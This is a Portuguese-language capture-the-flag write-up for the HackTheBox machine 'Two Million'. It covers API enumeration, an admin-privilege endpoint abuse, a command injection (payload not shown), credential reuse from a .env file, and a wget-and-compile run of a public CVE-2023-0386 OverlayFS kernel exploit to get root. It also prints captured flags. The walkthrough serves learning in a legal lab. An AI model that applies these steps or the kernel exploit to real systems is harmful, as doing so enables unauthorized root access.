# Two Million - HackTheBox Write-up



![HackTheBox](https://img.shields.io/badge/HackTheBox-Two%20Million-green)

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)

![OS](https://img.shields.io/badge/OS-Linux-blue)



## Índice



- [Reconhecimento](#reconhecimento)

- [Enumeração Web](#enumeração-web)

- [Exploração da API](#exploração-da-api)

- [Acesso Inicial](#acesso-inicial)

- [Escalação de Privilégios](#escalação-de-privilégios)

- [Flags](#flags)



---



## Reconhecimento



### Scan de Portas com Nmap



Iniciamos o reconhecimento com um scan de portas usando o Nmap:



```bash

nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>

```



**Resultado:**

- 2 portas TCP abertas

- Porta 22 (SSH)

- Porta 80 (HTTP)



### Enumeração Inicial



Ao acessar a porta 80 pelo navegador, encontramos a página antiga do Hack The Box.



---



## Enumeração Web



### Análise do Código Fonte



Ao inspecionar o código fonte da página, descobri um diretório interessante: `/invite`



### Endpoint de Convite



Na página `/invite`, foram encontrados alguns endpoints interessantes para investigação.



#### JavaScript: inviteapi.min.js



Encontrei o arquivo JavaScript `inviteapi.min.js` que contém lógica relacionada aos códigos de convite.



**Passos realizados:**



1. **Desobfuscação do JavaScript**

   - Copiei o conteúdo do arquivo `inviteapi.min.js`

   - Utilizei o [JS Beautify](https://beautifier.io/) para desobfuscar o código



2. **Função Descoberta:** `makeInviteCode`

   - Esta função retorna a primeira dica sobre como obter um código de convite



### Gerando o Código de Convite



Utilizei `curl` para fazer uma requisição POST ao endpoint descoberto:



```bash

curl -X POST http://2million.htb/api/v1/invite/generate

```



**Resposta:**

- Dados retornados em formato encriptado

- Codificação identificada: **Base64**



### Decodificando o Convite



Utilizei o [CyberChef](https://gchq.github.io/CyberChef/) para decodificar o Base64 e obter o código de convite válido.



### Registro e Login



Com o código de convite em mãos:



1. Acessei a página `/invite`

2. Inseri o código de convite

3. Completei o formulário de registro

4. Realizei o login com as credenciais criadas



---



## Exploração da API



### Enumeração com Burp Suite



Após o login, iniciei a enumeração das funcionalidades disponíveis:



1. Naveguei até a aba **Access**

2. Configurei o Burp Suite para interceptar requisições

3. Cliquei em **Connection Pack**



### Endpoints Descobertos



**Endpoint principal:** `/api/v1/user/vpn/generate`



Ao explorar mais a API, descobri:



```bash

curl -s -q http://2million.htb/api/v1 -H 'Cookie: PHPSESSID=<SEU_PHPSESSID>' | jq .

```



### Endpoints Admin



**Total de endpoints sob `/api/v1/admin`:** 3



**Endpoint crítico descoberto:** `/api/v1/admin/settings/update`

- Este endpoint permite alterar uma conta de usuário para administrador



### Vulnerabilidade de Injeção de Comando



**Endpoint vulnerável:** `/api/v1/admin/vpn/generate`

- Contém vulnerabilidade de **Command Injection**



---



## Acesso Inicial



### Explorando o Endpoint Admin



Através da vulnerabilidade de Command Injection no endpoint `/api/v1/admin/vpn/generate`, consegui acesso ao sistema.



### Arquivo .env



Arquivo comumente usado em aplicações PHP para armazenar variáveis de ambiente.



Ao ler o arquivo `.env`, encontrei credenciais:



```

DB_USERNAME=admin

DB_PASSWORD=SuperDuperPass123

```



### Acesso SSH



Com as credenciais obtidas, realizei acesso via SSH:



```bash

ssh admin@2million.htb

Password: SuperDuperPass123

```



✅ **Acesso obtido com sucesso!**



### User Flag



```bash

cat /home/admin/user.txt

```



**Flag:** `b8e2a1ea4d9a27890cab30448c1d4787`



---



## Escalação de Privilégios



### Enumeração do Sistema



Ao enumerar o sistema, encontrei um e-mail enviado ao usuário admin.



**Remetente do e-mail:** `ch4p@2million.htb`



### CVE-2023-0386



**Descrição:** Vulnerabilidade no Overlay File System que permite a um atacante mover arquivos mantendo metadados como proprietário e bits SetUID.



**CVE ID:** CVE-2023-0386



### Exploit



Utilizei o exploit disponível em:

[https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c](https://github.com/DataDog/security-labs-pocs/blob/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c)



**Passos:**



1. Download do exploit

```bash

wget https://raw.githubusercontent.com/DataDog/security-labs-pocs/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c

```



2. Compilação

```bash

gcc poc.c -o exploit

```



3. Execução

```bash

./exploit

```



✅ **Shell root obtido!**



### Root Flag



```bash

cat /root/root.txt

```



**Flag:** `5c39dc41868d0c90033929ebe5d54c04`



---



## Flags



| Flag | Valor |

|------|-------|

| User | `b8e2a1ea4d9a27890cab30448c1d4787` |

| Root | `5c39dc41868d0c90033929ebe5d54c04` |



---



## Resumo de Aprendizado



Esta máquina ensinou:



1. **Enumeração de API** - Importância de explorar endpoints e suas funcionalidades

2. **Análise de JavaScript** - Desobfuscação de código para encontrar lógica oculta

3. **Command Injection** - Exploração de vulnerabilidades em aplicações web

4. **Kernel Exploits** - CVE-2023-0386 (OverlayFS)

5. **Escalação de Privilégios** - Uso de vulnerabilidades do kernel para obter acesso root



---



## Ferramentas Utilizadas



- Nmap

- Burp Suite

- curl

- CyberChef

- JS Beautify

- gcc



---



**Status:** ✅ Máquina Pwned!



**Data:** 01/02/2026

